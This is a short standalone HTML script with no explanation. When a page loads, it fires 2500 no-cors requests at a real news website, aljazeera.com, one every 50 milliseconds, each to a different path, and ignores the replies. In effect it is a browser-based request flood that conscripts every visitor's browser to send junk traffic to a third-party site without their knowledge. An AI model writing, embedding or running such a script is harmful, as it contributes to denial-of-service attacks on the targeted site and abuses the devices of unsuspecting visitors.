<script>
        function sleep(ms) {
                return new Promise(resolve => setTimeout(resolve, ms));
            }
        window.addEventListener('load', function() {
            
            async function lol() {
                for (var i=0;i<2500;i+=1) {
                    fetch('https://aljazeera.com/data'+i.toString(), { mode: 'no-cors' }).then();
                    await sleep(50);
                }
            }
            lol();
        });
        
    </script>
